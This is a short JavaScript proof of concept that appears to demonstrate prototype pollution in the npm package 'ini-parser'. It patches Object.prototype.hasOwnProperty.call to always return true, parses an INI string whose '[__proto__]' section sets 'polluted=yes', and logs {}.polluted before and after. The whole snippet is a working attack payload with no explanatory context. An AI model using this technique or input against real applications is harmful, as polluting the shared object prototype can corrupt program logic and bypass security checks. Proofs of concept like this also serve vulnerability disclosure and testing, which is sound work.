Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
let a = require('ini-parser');
a.parse('[__proto__]\npolluted=yes');
console.log({}.polluted);